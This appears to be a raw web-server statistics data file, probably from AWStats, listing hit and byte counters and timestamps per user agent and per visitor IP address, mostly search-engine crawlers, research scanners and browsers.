4	1	0	26	0	25557131	25684278	0	25557131	25339972	0	7295	Mozilla/5.0 zgrab/0.x (compatible; Researchscan/t12ca; +http://researchscan.comsys.rwth-aachen.de)
4	1	1	0	1	25257798	0	25610408	25257798	0	25610408	44039	Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/4.0; InfoPath.2; SV1; .NET CLR 2.0.50727; WOW64)
4	0	0	1	0	0	25662182	0	0	25662182	0	0	Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/530.4 (KHTML, like Gecko) Chrome/2.0.172.0 Safari/530.4
4	1	1	0	0	25480012	0	0	25480012	0	0	44042	eg
4	0	0	0	5	0	0	25354353	0	0	25188231	0	Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0
4	4	3	2	0	25562571	25562571	0	25150191	25562571	0	139349	Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.89 Safari/537.36
4	1	1	0	0	25393738	0	0	25393738	0	0	44039	cv
4	1	1	0	0	25475994	0	0	25475994	0	0	44033	cu
4	0	0	0	4	0	0	25200826	0	0	25200826	0	Mozilla/5.0 (Windows NT 6.1; rv:36.0) Gecko/20100101 Firefox/36.0
4	1	1	0	0	25393928	0	0	25393928	0	0	44018	dk
4	0	0	1	0	0	25428553	0	0	25428553	0	0	Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.14 (KHTML, like Gecko) Chrome/24.0.1292.0 Safari/537.14
4	2	2	0	0	25522579	0	0	25433490	0	0	88079	Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2226.0 Safari/537.36
4	0	0	1	0	0	25433490	0	0	25433490	0	0	Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36
4	20	20	21	1	25687257	25688733	25586032	25592430	25586881	25586032	880380	Mozilla/5.0 (compatible; Nimbostratus-Bot/v1.3.2; http://cloudsystemnetworks.com)
4	209	0	70	454	25688477	25571616	25689665	25083509	25420299	25083509	171149	Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
4	6	5	0	0	25526722	0	0	25526722	0	0	167658	BacklinkCrawler (http://www.backlinktest.com/crawler.html)
4	0	0	0	1	0	0	25366704	0	0	25366704	0	Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36
4	1	1	0	0	25476736	0	0	25476736	0	0	44039	bu
4	1	1	0	0	25504679	0	0	25504679	0	0	44042	db
4	0	0	1	0	0	25428553	0	0	25428553	0	0	Mozilla/5.0 (Windows NT 6.1; WOW64; rv:21.0) Gecko/20130401 Firefox/21.0
4	1	1	0	0	25345650	0	0	25345650	0	0	44033	Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27
4	1	1	0	0	25308820	0	0	25308820	0	0	0	Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36
4	2	2	0	0	25522580	0	0	25433493	0	0	88076	Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)
4	1	1	0	0	25496964	0	0	25496964	0	0	44033	qe
4	5	4	0	0	25683086	0	0	25588341	0	0	176133	Mozilla/5.0 (compatible; coccocbot-web/1.0; +http://help.coccoc.com/searchengine)
4	1	1	0	0	25282352	0	0	25282352	0	0	44018	Mozilla/5.0 (Windows NT 6.1; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0
4	0	0	0	15	0	0	25339016	0	0	25157397	0	Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko
4	4	4	4	0	25408639	25408639	0	25112545	25112545	0	140496	redback/v0-570-g26f8c96
4	6	6	0	4	25340041	0	25340041	25337857	0	25337857	88036	python-requests/1.2.3 CPython/2.7.12 Linux/4.9.76-3.78.amzn1.x86_64
4	1	1	0	0	25391389	0	0	25391389	0	0	44018	oi
4	0	0	0	1	0	0	25141914	0	0	25141914	0	Mozilla/5.0 (Windows NT 6.1; WOW64)AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11
4	0	0	3	0	0	25278093	0	0	25277635	0	0	Mozilla/5.0 zgrab/0.x -- We are scanning for research, further information at http://researchscan.comsys.rwth-aachen.de/ --
4	0	0	1	0	0	25479845	0	0	25479845	0	0	Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.16 Safari/537.36
4	0	0	0	1	0	0	25077729	0	0	25077729	0	Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36
4	1	1	0	0	25433490	0	0	25433490	0	0	44033	Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:27.0) Gecko/20121011 Firefox/27.0
4	0	0	1	0	0	25527490	0	0	25527490	0	0	Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.93 Safari/537.36
4	1	1	0	0	25522588	0	0	25522588	0	0	44034	Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko
4	1	1	0	0	25610420	0	0	25610420	0	0	44019	Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1
4	0	0	18	0	0	25269086	0	0	25179326	0	0	Mozilla/5.0 zgrab/0.x
4	0	0	1	0	0	25477587	0	0	25477587	0	0	ne
4	1	1	0	0	25610410	0	0	25610410	0	0	44034	Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.93 Safari/537.36
4	1	1	0	0	25394085	0	0	25394085	0	0	44018	mm
4	0	0	1	0	0	25287045	0	0	25287045	0	0	Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.2 Safari/537.36
4	1	1	0	0	25479845	0	0	25479845	0	0	0	Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1664.3 Safari/537.36
4	2	2	0	8	25683749	0	25681875	25682923	0	25541664	88053	Mozilla/5.0 (compatible; nsrbot/1.0; &#43;http://netsystemsresearch.com)
4	2	2	0	0	25257801	0	0	25257798	0	0	88075	Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36
4	0	0	18	0	0	25464576	0	0	25287657	0	0	Mozilla/5.0 zgrab/0.x (compatible; Researchscan/t13l; +http://researchscan.comsys.rwth-aachen.de)
4	1	1	0	0	25393865	0	0	25393865	0	0	44018	kv
4	1	1	0	0	25433498	0	0	25433498	0	0	44042	Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2224.3 Safari/537.36
4	8	8	0	17	25631904	0	25631905	25629363	0	25629363	352152	Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0
4	0	0	1	2	0	25474140	25077554	0	25474140	25077554	0	Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36
4	1	1	0	0	25668180	0	0	25668180	0	0	44019	Mozilla/5.0 (Windows NT 6.1; WOW64; rv:37.0) Gecko/20100101 Firefox/37.0
4	0	0	1	0	0	25607701	0	0	25607701	0	0	Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1500.55 Safari/537.36
4	0	0	1	0	0	25441155	0	0	25441155	0	0	Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.170 Safari/537.36
4	4	0	6	0	25556848	25556848	0	25484526	25430918	0	14704	Mozilla/5.0 (compatible; archive.org_bot; Wayback Machine Live Record; +http://archive.org/details/archive.org_bot)
4	0	0	0	12	0	0	25583151	0	0	25555760	0	Mozilla/5.0 (compatible; nsrbot/1.0; http://netsystemsresearch.com)
4	1	1	0	0	25476745	0	0	25476745	0	0	44018	km
4	3	3	0	0	25630068	0	0	25194790	0	0	62200	Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36
4	1	0	1	0	25570135	25570135	0	25570135	25570135	0	7295	curl/7.60.0
4	1	1	2	0	25257801	25257801	0	25257801	25257801	0	44042	Mozilla/5.0 (Windows; U; Windows NT 6.1; fr-FR) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27
4	2	2	0	1	25494218	0	25181000	25327573	0	25181000	88036	Mozilla/3.0 (compatible; Indy Library)
4	1	1	0	0	25479953	0	0	25479953	0	0	44042	zc
4	1	1	0	0	25409291	0	0	25409291	0	0	44018	python-requests/2.18.4
4	0	0	1	0	0	25194790	0	0	25194790	0	0	Mozilla/5.0 (Windows NT 6.1; WOW64; rv:51.0) Gecko/20100101 Firefox/51.0
4	586	378	571	0	25678095	25560536	0	25080000	25079763	0	14389598	Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)
4	1	1	0	0	25392675	0	0	25392675	0	0	44018	jn
4	20	20	0	0	25189345	0	0	25159206	0	0	211540	Magic Browser
4	1	1	0	0	25287045	0	0	25287045	0	0	0	Mozilla/5.0 (Windows NT 5.1; rv:21.0) Gecko/20100101 Firefox/21.0
4	1	1	0	0	25498420	0	0	25498420	0	0	44039	ya
4	1	1	0	0	25393721	0	0	25393721	0	0	44018	iq
4	1	1	0	0	25522600	0	0	25522600	0	0	44034	Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0
4	1	1	0	0	25486101	0	0	25486101	0	0	44033	ip
4	0	0	1	0	0	25501604	0	0	25501604	0	0	ht
4	0	0	0	1	0	0	25077729	0	0	25077729	0	Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36
4	1	1	0	0	25504671	0	0	25504671	0	0	44042	ii
4	0	0	1	0	0	25308820	0	0	25308820	0	0	Mozilla/5.0 (Windows NT 6.2; rv:22.0) Gecko/20130405 Firefox/23.0
4	65	65	19	9	25652812	25652771	25652803	25084743	25084781	25568534	2714732	Mozilla/5.0 (compatible; NetcraftSurveyAgent/1.0; +info@netcraft.com)
4	1	1	0	0	25392753	0	0	25392753	0	0	44018	gv
4	1	1	0	0	25395641	0	0	25395641	0	0	44042	vo
4	1	1	0	0	25498367	0	0	25498367	0	0	44018	we
4	1	0	29	0	25564639	25681539	0	25564639	25338302	0	7295	Mozilla/5.0 zgrab/0.x (compatible; Researchscan/t13rl; +http://researchscan.comsys.rwth-aachen.de)
4	5	1	105	0	25572077	25686963	0	25135989	25138851	0	38014	Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36
4	1	0	28	0	25562015	25681796	0	25562015	25371318	0	7295	Mozilla/5.0 zgrab/0.x (compatible; Researchscan/t12sns; +http://researchscan.comsys.rwth-aachen.de)
4	1	1	0	0	25394116	0	0	25394116	0	0	44039	tw
4	0	0	1	0	0	25395690	0	0	25395690	0	0	fs
4	1	1	0	0	25335719	0	0	25335719	0	0	0	Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.93 Safari/537.36
4	0	0	4	0	0	25298994	0	0	25288145	0	0	Mozilla/5.0 zgrab/0.x (compatible; Researchscan/t12l; +http://researchscan.comsys.rwth-aachen.de)
4	1	1	0	0	25394621	0	0	25394621	0	0	44033	sy
4	1	1	1	0	25622713	25622713	0	25622713	25622713	0	44019	Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.50 Safari/537.36
4	130	130	37	49	25687293	25687097	25687145	25081277	25123484	25122022	0	Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.85 Safari/537.36
4	1	1	0	0	25662182	0	0	25662182	0	0	0	Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.206.1 Safari/532.0
4	5	0	0	0	25196881	0	0	25080340	0	0	0	COMODO SSL Checker
5	7	7	5	0	25202933	25202501	0	25199225	25198970	0	308126	207.46.13.176
5	0	0	0	2	0	0	25638326	0	0	25638062	0	66.249.65.139
5	2	2	1	0	25246499	25103926	0	25103494	25103926	0	87662	207.46.13.174
5	1	1	0	0	25330282	0	0	25330282	0	0	44018	207.46.13.169
5	1	1	0	0	25338031	0	0	25338031	0	0	44018	207.46.13.170
5	3	3	2	0	25287526	25287251	0	25119042	25118659	0	132084	207.46.13.168
5	0	0	0	1	0	0	25188231	0	0	25188231	0	5.8.48.17
5	3	0	0	8	25396151	0	25396151	25214122	0	25134697	171	66.249.79.93
5	1	1	0	0	25242265	0	0	25242265	0	0	44018	207.46.13.160
5	3	0	0	6	25393702	0	25222100	25208756	0	25134701	171	66.249.79.91
5	1	1	1	0	25177729	25177471	0	25177729	25177471	0	8817	207.46.13.157
5	3	0	0	7	25388320	0	25397319	25218122	0	25218122	171	66.249.79.89
5	3	3	2	0	25309459	25309196	0	25263647	25263308	0	132054	207.46.13.156
5	1	1	0	0	25367911	0	0	25367911	0	0	44018	207.46.13.154
5	3	3	2	0	25253233	25252981	0	25251612	25252178	0	132054	207.46.13.152
5	1	1	0	0	25179620	0	0	25179620	0	0	44018	138.197.100.187
5	1	1	2	0	25204987	25175026	0	25204987	25124767	0	44018	158.85.81.126
5	1	1	0	0	25371695	0	0	25371695	0	0	44018	158.85.81.125
5	3	3	1	0	25473610	25406407	0	25173718	25406407	0	132054	158.85.81.124
5	1	1	3	0	25407345	25472255	0	25407345	25424707	0	44018	158.85.81.123
5	1	1	1	0	25290595	25290320	0	25290595	25290320	0	44018	207.46.13.146
5	1	1	2	0	25124735	25376270	0	25124735	25162006	0	44048	158.85.81.122
5	1	1	0	0	25345346	0	0	25345346	0	0	44042	159.65.171.77
5	0	0	1	0	0	25178266	0	0	25178266	0	0	207.46.13.144
5	0	0	1	0	0	25411556	0	0	25411556	0	0	158.85.81.119
5	0	0	1	0	0	25393345	0	0	25393345	0	0	207.46.13.143
5	1	1	0	0	25115529	0	0	25115529	0	0	44048	158.85.81.120
5	1	1	0	0	25239135	0	0	25239135	0	0	44018	158.85.81.118
5	1	1	0	0	25268306	0	0	25268306	0	0	44018	207.46.13.139
5	0	0	1	0	0	25382565	0	0	25382565	0	0	158.85.81.116
5	1	1	1	0	25183852	25155460	0	25183852	25155460	0	44018	158.85.81.115
5	2	2	2	0	25288514	25217602	0	25122065	25122491	0	88066	207.46.13.137
5	2	2	4	0	25481352	25444786	0	25477435	25232973	0	88036	158.85.81.114
5	1	1	1	0	25341309	25341052	0	25341309	25341052	0	44018	207.46.13.136
5	1	1	1	0	25292017	25291724	0	25292017	25291724	0	44018	207.46.13.135
5	0	0	1	0	0	25347124	0	0	25347124	0	0	38.140.161.170
5	3	3	0	0	25337583	0	0	25220299	0	0	132054	207.46.13.133
5	3	3	0	0	25171947	0	0	25147352	0	0	26451	207.46.13.130
5	1	1	0	0	25133830	0	0	25133830	0	0	8834	207.46.13.127
5	1	1	0	0	25335180	0	0	25335180	0	0	44018	207.46.13.126
5	1	1	1	0	25172812	25172444	0	25172812	25172444	0	8817	207.46.13.125
5	2	2	1	0	25207097	25206839	0	25206395	25206839	0	88036	207.46.13.124
5	1	1	0	0	25388555	0	0	25388555	0	0	44018	159.203.119.68
5	1	1	1	0	25351883	25351571	0	25351883	25351571	0	44018	207.46.13.122
5	0	0	1	0	0	25218359	0	0	25218359	0	0	207.46.13.121
5	1	1	0	0	25234786	0	0	25234786	0	0	44018	207.46.13.119
5	1	1	0	0	25216327	0	0	25216327	0	0	44042	165.227.66.5
5	0	0	1	0	0	25128639	0	0	25128639	0	0	40.77.167.8
5	1	1	4	0	25536081	25508124	0	25536081	25372857	0	44019	169.53.184.28
5	1	1	2	0	25132598	25259761	0	25132598	25132335	0	8833	40.77.167.7
5	0	0	1	0	0	25272214	0	0	25272214	0	0	207.46.13.115
5	1	1	1	0	25140362	25140102	0	25140362	25140102	0	8817	40.77.167.5
5	8	0	3	12	25620447	25565717	25680054	25372757	25436858	25347097	22170	66.249.79.45
5	1	1	1	0	25105068	25092864	0	25105068	25092864	0	43644	207.46.13.113
5	3	3	3	0	25082901	25083423	0	25081708	25081302	0	130932	40.77.167.2
5	8	0	1	21	25605187	25448758	25680651	25400988	25448758	25316335	22170	66.249.79.42
5	0	0	6	0	0	25194503	0	0	25145312	0	0	54.67.67.222
5	2	2	0	0	25374349	0	0	25371901	0	0	88036	40.77.167.1
5	1	1	0	0	25291315	0	0	25291315	0	0	44018	38.142.192.82
5	2	2	3	0	25138771	25381491	0	25138513	25138264	0	17667	207.46.13.7
5	7	0	0	11	25677542	0	25678836	25358224	0	25361691	399	66.249.79.37
5	1	1	0	0	25216933	0	0	25216933	0	0	44018	207.46.13.104
5	0	0	1	0	0	25119498	0	0	25119498	0	0	207.46.13.103
5	1	1	0	0	25248694	0	0	25248694	0	0	44018	207.46.13.102
5	2	2	0	0	25120501	0	0	25119712	0	0	88096	207.46.13.2
5	1	1	0	0	25216288	0	0	25216288	0	0	44033	45.55.244.103
5	3	3	3	0	25154385	25367633	0	25153343	25153090	0	26451	207.46.13.101
5	1	1	1	0	25198375	25198121	0	25198375	25198121	0	44018	207.46.13.100
5	0	0	1	0	0	25321246	0	0	25321246	0	0	207.46.13.0
5	0	0	0	1	0	0	25128352	0	0	25128352	0	66.249.79.29
5	0	0	2	0	0	25428553	0	0	25428553	0	0	138.197.154.184
5	1	0	0	0	25128350	0	0	25128350	0	0	57	66.249.79.27
5	0	0	2	0	0	25351728	0	0	25312326	0	0	38.142.192.66
5	0	0	0	1	0	0	25128350	0	0	25128350	0	66.249.79.25
5	0	0	1	0	0	25520648	0	0	25520648	0	0	159.65.181.104
5	48	48	23	41	25687293	25687097	25687145	25446154	25446627	25545586	0	138.246.253.5
5	0	0	2	0	0	25257801	0	0	25257801	0	0	162.222.151.215
5	1	1	0	0	25474426	0	0	25474426	0	0	18206	104.236.104.152
5	1	1	0	0	25632755	0	0	25632755	0	0	44019	209.17.96.82
5	1	1	0	0	25311588	0	0	25311588	0	0	44018	38.142.192.50
5	7	7	4	0	25362062	25361747	0	25284139	25284626	0	308126	157.55.39.96
5	0	0	2	0	0	25442487	0	0	25435818	0	0	169.54.244.93
5	1	1	1	0	25386537	25387015	0	25386537	25387015	0	44018	157.55.39.93
5	3	3	3	0	25365596	25383116	0	25196653	25197416	0	132054	157.55.39.92
5	0	0	1	0	0	25636739	0	0	25636739	0	0	209.17.96.74
5	0	0	2	0	0	25174103	0	0	25115849	0	0	157.55.39.91
5	2	2	2	0	25181628	25181288	0	25180726	25180475	0	17634	157.55.39.90
5	1	1	2	2	25495229	25420682	25546954	25495229	25382388	25542903	44018	169.54.244.89
5	2	2	1	0	25331079	25330825	0	25267438	25330825	0	88036	157.55.39.85
5	1	1	4	1	25511217	25455761	25541664	25511217	25179089	25541664	44019	169.54.244.84
5	1	1	0	0	25130846	0	0	25130846	0	0	44069	104.236.123.54
5	1	1	0	0	25596597	0	0	25596597	0	0	44019	209.17.96.66
5	0	0	1	0	0	25332037	0	0	25332037	0	0	38.142.192.34
5	2	2	0	0	25366641	0	0	25180596	0	0	88036	169.54.244.82
5	1	1	0	0	25260389	0	0	25260389	0	0	44039	45.55.238.104
5	0	0	1	0	0	25385461	0	0	25385461	0	0	157.55.39.82
5	3	3	0	0	25476736	0	0	25391432	0	0	132096	185.35.63.5
5	4	4	1	0	25595621	25340499	0	25104179	25340499	0	175699	157.55.39.81
5	1	1	1	0	25101019	25100742	0	25101019	25100742	0	43644	157.55.39.79
5	0	0	1	0	0	25235999	0	0	25235999	0	0	169.54.244.78
5	2	2	1	0	25341887	25334243	0	25127879	25334243	0	88066	38.142.184.10
5	1	1	0	0	25646101	0	0	25646101	0	0	44019	157.55.39.75
5	1	1	0	0	25522579	0	0	25522579	0	0	44040	38.130.169.161
5	0	0	2	0	0	25537151	0	0	25251804	0	0	169.54.244.75
5	1	1	1	0	25258777	25281590	0	25258777	25281590	0	44018	157.55.39.71
5	1	1	0	0	25476745	0	0	25476745	0	0	44018	185.35.63.245
5	0	0	1	0	0	25287972	0	0	25287972	0	0	157.55.39.70
5	0	0	12	0	0	25442680	0	0	25267962	0	0	157.55.39.68
5	1	1	0	0	25377162	0	0	25377162	0	0	44018	157.55.39.67
5	1	1	0	0	25302189	0	0	25302189	0	0	44018	38.142.192.18
5	0	0	1	0	0	25568606	0	0	25568606	0	0	142.93.67.240
5	1	1	0	0	25353096	0	0	25353096	0	0	44018	157.55.39.65
5	0	0	0	1	0	0	25610408	0	0	25610408	0	206.206.108.237
5	1	1	0	0	25179629	0	0	25179629	0	0	44039	174.138.56.235
5	3	3	1	0	25335971	25235720	0	25235216	25235720	0	132054	157.55.39.63
5	2	2	0	0	25329431	0	0	25097159	0	0	87662	157.55.39.62
5	0	0	1	0	0	25171411	0	0	25171411	0	0	157.55.39.59
5	2	2	2	0	25275283	25096234	0	25095607	25095354	0	87662	157.55.39.58
5	6	0	4	0	25560536	25560536	0	25395384	25556206	0	29294	157.55.39.57
5	0	0	1	0	0	25382236	0	0	25382236	0	0	157.55.39.56
5	1	1	1	0	25097982	25098413	0	25097982	25098413	0	43644	157.55.39.54
5	10	0	8	0	25170837	25300558	0	25086107	25162769	0	570	157.55.39.8
5	6	0	2	0	25411512	25174103	0	25174365	25174103	0	342	157.55.39.53
5	4	0	10	0	25284798	25328303	0	25276790	25189482	0	228	157.55.39.52
5	18	0	8	0	25343743	25393344	0	25288365	25112190	0	1026	157.55.39.6
5	4	0	6	0	25225682	25204214	0	25206395	25204210	0	228	157.55.39.51
5	10	0	8	0	25490828	25223686	0	25215432	25215205	0	570	157.55.39.50
5	0	0	1	0	0	25389579	0	0	25389579	0	0	104.236.51.208
5	4	0	2	0	25674171	25252981	0	25253233	25252981	0	228	157.55.39.48
5	1	1	0	0	25257801	0	0	25257801	0	0	44033	38.130.164.174
5	4	0	2	0	25292017	25099294	0	25268304	25099294	0	228	157.55.39.47
5	12	0	19	0	25678095	25249738	0	25116983	25118658	0	684	157.55.39.3
5	2	0	6	0	25302390	25159260	0	25302390	25159255	0	114	157.55.39.2
5	2	2	1	0	25205515	25120948	0	25205339	25120948	0	88036	157.55.39.46
5	2	0	2	0	25388118	25390097	0	25388118	25390097	0	114	157.55.39.1
5	5	5	4	0	25361282	25361026	0	25262789	25300047	0	220090	157.55.39.45
5	0	0	1	0	0	25219210	0	0	25219210	0	0	157.55.39.44
5	0	0	6	0	0	25427843	0	0	25427839	0	0	157.55.39.0
5	0	0	1	0	0	25328303	0	0	25328303	0	0	157.55.39.39
5	0	0	1	0	0	25126684	0	0	25126684	0	0	157.55.39.40
5	0	0	1	0	0	25428695	0	0	25428695	0	0	66.249.73.153
5	1	1	0	0	25096502	0	0	25096502	0	0	43644	157.55.39.38
5	0	0	1	0	0	25216864	0	0	25216864	0	0	157.55.39.36
5	2	2	0	0	25687257	0	0	25622309	0	0	88038	209.17.96.18
5	1	1	0	0	25475994	0	0	25475994	0	0	44033	185.35.63.210
5	0	0	8	0	0	25324115	0	0	25316495	0	0	157.55.39.33
5	5	0	4	0	25403813	25362592	0	25362848	25207684	0	285	157.55.39.32
5	3	3	2	0	25384952	25384688	0	25125654	25383940	0	132084	157.55.39.30
5	1	1	0	0	25403813	0	0	25403813	0	0	44018	157.55.39.29
5	1	0	0	2	25148027	0	25468019	25148027	0	25148028	57	66.249.73.8
5	2	0	20	0	25136987	25313563	0	25136987	25136738	0	114	157.55.39.28
5	4	0	2	0	25339913	25339652	0	25212429	25339652	0	228	157.55.39.26
5	0	0	0	1	0	0	25468057	0	0	25468057	0	66.249.73.6
5	0	0	2	0	0	25226258	0	0	25226258	0	0	157.55.39.25
5	0	0	4	0	0	25369154	0	0	25186359	0	0	157.55.39.24
5	0	0	0	1	0	0	25148027	0	0	25148027	0	66.249.73.4
5	8	0	0	0	25261905	0	0	25091686	0	0	456	157.55.39.23
5	4	0	4	0	25114042	25115161	0	25094711	25092842	0	228	157.55.39.22
5	16	0	8	0	25336757	25335619	0	25088354	25140102	0	912	157.55.39.21
5	1	1	0	0	25223998	0	0	25223998	0	0	44018	157.55.39.19
5	4	0	5	0	25556206	25556206	0	25199987	25198970	0	7466	157.55.39.20
5	2	0	2	0	25384952	25383940	0	25384952	25383940	0	114	157.55.39.18
5	1	1	0	0	25498367	0	0	25498367	0	0	44018	185.35.63.182
5	2	2	0	0	25217904	0	0	25217861	0	0	88036	157.55.39.16
5	12	0	18	0	25595621	25356839	0	25107284	25108592	0	684	157.55.39.15
5	4	0	2	0	25151003	25124547	0	25082900	25124547	0	228	157.55.39.14
5	1	1	0	0	25394085	0	0	25394085	0	0	44018	185.35.63.179
5	2	2	0	0	25480012	0	0	25394116	0	0	88081	185.35.63.178
5	2	0	2	0	25104178	25089811	0	25104178	25089811	0	114	157.55.39.13
5	4	0	6	0	25296180	25297226	0	25281856	25086680	0	228	157.55.39.12
5	1	1	0	0	25522600	0	0	25522600	0	0	44034	104.238.54.218
5	2	0	0	0	25646101	0	0	25646101	0	0	114	157.55.39.11
5	2	2	0	0	25498420	0	0	25479953	0	0	88081	185.35.63.170
5	0	0	0	2	0	0	25077554	0	0	25077554	0	45.77.63.79
5	3	2	2	0	25562571	25562571	0	25150191	25562571	0	95331	103.255.254.135
5	0	0	2	0	0	25556848	0	0	25430918	0	0	207.241.226.230
5	1	1	0	0	25395641	0	0	25395641	0	0	44042	185.35.63.150
5	1	1	0	0	25496964	0	0	25496964	0	0	44033	185.35.63.148
5	1	1	0	0	25395629	0	0	25395629	0	0	44042	185.35.63.146
5	1	1	0	0	25260397	0	0	25260397	0	0	44018	159.203.124.132
5	1	1	0	0	25378308	0	0	25378308	0	0	44018	103.255.254.123
5	1	1	1	0	25647119	25684089	0	25647119	25684089	0	44019	209.17.96.250
5	0	0	1	0	0	25199891	0	0	25199891	0	0	13.56.159.157
5	1	1	0	0	25609873	0	0	25609873	0	0	44019	159.65.34.28
5	0	0	1	0	0	25586881	0	0	25586881	0	0	209.17.96.234
5	0	0	2	0	0	25688733	0	0	25617735	0	0	209.17.96.226
5	1	1	1	0	25335719	25335719	0	25335719	25335719	0	0	159.89.114.99
5	0	0	3	0	0	25674116	0	0	25601758	0	0	209.17.96.218
5	1	1	1	0	25287045	25287045	0	25287045	25287045	0	0	67.205.132.201
5	1	1	0	0	25392753	0	0	25392753	0	0	44018	185.35.63.108
5	1	1	0	0	25389630	0	0	25389630	0	0	18203	104.236.45.124
5	2	2	0	0	25672413	0	0	25618193	0	0	88038	209.17.96.194
5	0	0	2	0	0	25643583	0	0	25627469	0	0	209.17.96.202
5	1	1	0	0	25282352	0	0	25282352	0	0	44018	212.83.177.250
5	0	0	1	0	0	25556848	0	0	25556848	0	0	207.241.232.121
5	1	0	0	0	25504868	0	0	25504868	0	0	57	207.241.232.120
5	3	3	0	2	25337857	0	25337857	25337857	0	25337857	44018	18.197.161.0
5	1	1	1	0	25642482	25593696	0	25642482	25593696	0	44019	209.17.96.186
5	0	0	1	0	0	25294781	0	0	25294781	0	0	38.142.192.2
5	1	1	0	0	25329940	0	0	25329940	0	0	44018	38.142.99.42
5	1	1	0	0	25668180	0	0	25668180	0	0	44019	203.113.152.7
5	0	0	2	0	0	25314176	0	0	25284711	0	0	38.142.99.34
5	1	1	0	0	25084744	0	0	25084744	0	0	43668	104.236.206.190
5	1	1	0	0	25626832	0	0	25626832	0	0	44019	209.17.96.170
5	0	0	2	0	0	25280824	0	0	25129341	0	0	38.142.99.26
5	1	1	1	0	25613346	25612159	0	25613346	25612159	0	44019	209.17.96.162
5	1	1	0	2	25629469	0	25629469	25629469	0	25629469	44019	120.27.230.222
5	1	1	0	0	25388118	0	0	25388118	0	0	44018	40.77.167.212
5	0	0	2	0	0	25363134	0	0	25301706	0	0	38.142.99.18
5	1	1	0	0	25652885	0	0	25652885	0	0	44019	209.17.96.154
5	5	0	0	0	25196881	0	0	25080340	0	0	0	178.255.87.242
5	0	0	0	5	0	0	25157397	0	0	25157397	0	192.187.123.162
5	1	1	1	0	25356319	25356839	0	25356319	25356839	0	44018	40.77.167.196
5	2	2	0	0	25273553	0	0	25273379	0	0	88036	40.77.167.193
5	0	0	0	1	0	0	25586032	0	0	25586032	0	209.17.96.146
5	1	1	0	2	25631904	0	25631905	25631904	0	25631904	44019	87.107.135.238
5	1	1	0	0	25326185	0	0	25326185	0	0	44018	40.77.167.191
5	0	0	0	1	0	0	25241138	0	0	25241138	0	195.154.59.236
5	1	1	0	0	25614707	0	0	25614707	0	0	44019	80.84.57.117
5	0	0	1	0	0	25427843	0	0	25427843	0	0	40.77.167.186
5	1	1	1	0	25607763	25652911	0	25607763	25652911	0	44019	209.17.96.138
